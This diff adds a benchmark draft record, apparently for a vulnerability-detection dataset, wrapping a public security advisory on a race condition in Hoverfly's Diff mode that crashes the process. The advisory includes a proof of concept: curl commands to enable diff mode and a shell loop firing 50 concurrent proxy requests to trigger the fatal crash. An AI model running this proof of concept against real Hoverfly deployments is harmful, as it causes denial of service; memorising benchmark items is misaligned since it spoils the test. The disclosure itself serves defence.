@@ -1,0 +1,63 @@
+{
+  "capture_id": "v7-race_condition-sparse_noisy",
+  "capture_method": "passive_source_snapshot",
+  "capture_reference": "https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-qrh4-p6v4-mrfg",
+  "case_kind": "sparse_noisy",
+  "collector": {
+    "kind": "v7_engine_unseen_public_source_draft",
+    "target_contact_performed": false,
+    "third_party_code_executed": false,
+    "version": "2.0.0"
+  },
+  "created_at": "2026-08-15T01:30:31.777156+00:00",
+  "cross_variant_mutation_used": false,
+  "draft_adjudication": {
+    "admission_output_used": false,
+    "basis": "source_observation_candidate",
+    "corpus_v1_evidence_used": false,
+    "corpus_v1_labels_used": false,
+    "corpus_v1_scores_used": false,
+    "detector_output_used": false,
+    "human_adjudication_complete": false,
+    "notes": "Partial frozen public-source metadata candidate; deliberately insufficient for positive admission until semantic review.",
+    "publication_authorized": false,
+    "ranking_output_used": false,
+    "semantic_review_required": true,
+    "v6_first_blind_case_errors_used": false,
+    "v6_first_blind_score_used": false
+  },
+  "draft_sha256": "7c81464069f1409eb330b9f0827a6bd09816ba2084e25e723a2c40f5d22fab07",
+  "draft_version": "2.0.0",
+  "family": "race_condition",
+  "first_blind_consumed": false,
+  "raw": {
+    "details": {
+      "observation_kind": "partial_public_source_metadata",
+      "version_boundary_count": 1
+    },
+    "method": "UNKNOWN"
+  },
+  "required_evidence_path": "benchmarks/raw/sources/v7_capture_evidence/race-condition--sparse-noisy.json",
+  "rule_version": "2026.08.15.6.33.v7.unseen.drafts.1",
+  "scoring_executed": false,
+  "source_project": "SpectoLabs/hoverfly",
+  "source_root": "GHSA-qrh4-p6v4-mrfg",
+  "source_snapshot": {
+    "frozen_canonical_snapshot_sha256": "2d704ba8cb7549733f4cc8ae1d56f00f00f5bfce81f999e03ae9d75d3bbef4ea",
+    "payload": {
+      "description": "### Summary:\n\nWhen Hoverfly is running in Diff mode, the `AddDiff()` function writes to the shared `responsesDiff` map without any synchronization (no mutex). When multiple proxy requests are processed concurrently (the normal case for any proxy), the concurrent map writes trigger Go's built-in race detector which causes a `fatal error: concurrent map read and map write`, immediately killing the entire Hoverfly process. This is trivially exploitable by sending multiple simultaneous requests.\n\n### Details:\n\n**1. Unsynchronized map access in `AddDiff()` (`core/hoverfly_service.go:417-421`):**\n\n```go\nfunc (hf *Hoverfly) AddDiff(requestView v2.SimpleRequestDefinitionView, diffReport v2.DiffReport) {\n    if len(diffReport.DiffEntries) > 0 {\n        diffs := hf.responsesDiff[requestView]                    // UNSYNCHRONIZED READ\n        hf.responsesDiff[requestView] = append(diffs, diffReport) // UNSYNCHRONIZED WRITE\n    }\n}\n```\n\n**2. This function is called from Diff mode processing, which runs concurrently per request (`core/modes/diff_mode.go`):**\n\nEach incoming proxy request is handled in its own goroutine by Go's `net/http` server. In Diff mode, each request calls `AddDiff()` after comparing the simulated and actual responses. With multiple concurrent requests, multiple goroutines write to the same map simultaneously.\n\n**3. Go's runtime detects concurrent map access and terminates the process:**\n\nUnlike data races on simple values (which produce undefined behavior silently), Go's map implementation includes a built-in concurrent access check. When two goroutines access the same map and at least one is writing, the runtime calls `fatal()` which is unrecoverable, it cannot be caught by `recover()`.\n\n**4. No mutex protection exists on `responsesDiff`:**\n\nThe field is declared as a plain `map[v2.SimpleRequestDefinitionView][]v2.DiffReport` with no associated `sync.RWMutex`. Compare with `hf.state` which properly uses `sync.RWMutex` for its map access.\n\n### Environment:\n\n- **Hoverfly version:** v1.12.7\n- **Operating System:** macOS Darwin 25.4.0\n- **Go version:** 1.26.2\n- **Configuration:** Hoverfly in Diff mode (`PUT /api/v2/hoverfly/mode {\"mode\":\"diff\"}`)\n\n### POC:\n\n**Step 1: Start Hoverfly and set Diff mode**\n\n```bash\n./hoverfly &\nsleep 2\n\n# Set diff mode\ncurl -X PUT http://localhost:8888/api/v2/hoverfly/mode \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"mode\": \"diff\"}'\n\n# Load a simulation for diff comparison\ncurl -X PUT http://localhost:8888/api/v2/simulation \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"data\": {\n      \"pairs\": [{\n        \"request\": {\"path\": [{\"matcher\": \"glob\", \"value\": \"*\"}]},\n        \"response\": {\"status\": 200, \"body\": \"expected\"}\n      }],\n      \"globalActions\": {\"delays\": [], \"delaysLogNormal\": []}\n    },\n    \"meta\": {\"schemaVersion\": \"v5.2\"}\n  }'\n```\n\n**Step 2: Send concurrent requests to trigger the race**\n\n```bash\n# Send 50 concurrent requests, race condition triggers within seconds\nfor i in $(seq 1 50); do\n    curl -s -x http://localhost:8500 \"http://httpbin.org/get?id=$i\" &\ndone\nwait\n```\n\n**Step 3: Observe the crash**\n\n```bash\n# Check if process is still running\npgrep -f hoverfly\n```\n\n**crash output on Hoverfly v1.12.7:**\n\n```\nfatal error: concurrent map read and map write\n\ngoroutine 892 [running]:\ngithub.com/SpectoLabs/hoverfly/core.(*Hoverfly).AddDiff(...)\n        /core/hoverfly_service.go:419\ngithub.com/SpectoLabs/hoverfly/core/modes.(*DiffMode).Process(...)\n```\n\nThe process crashes with ~50 concurrent requests. In production with real traffic, it crashes almost immediately.\n\n### Impact:\n\n- **Full denial of service:** The process terminates immediately and cannot be recovered without a restart\n- **Trivial exploitation:** Any attacker with proxy access can trigger this by sending multiple concurrent requests\n- **No admin API access required:** Only proxy port access is needed to trigger the crash\n- **Unrecoverable:** `fatal error` in Go cannot be caught by `recover()` — the process is unconditionally killed\n- **Affects all Diff mode users:** Any team using Diff mode for API comparison testing is vulnerable",
+      "ghsa_id": "GHSA-qrh4-p6v4-mrfg",
+      "version_boundaries": [
+        {
+          "ecosystem": "go",
+          "package": "github.com/SpectoLabs/hoverfly",
+          "patched_version": "1.12.8",
+          "vulnerable_version_range": "<= 1.12.7"
+        }
+      ]
+    },
+    "reference": "https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-qrh4-p6v4-mrfg",
+    "snapshot_role": "canonical_source_partial_metadata"
+  },
+  "synthetic_fixture_generated": false
+}
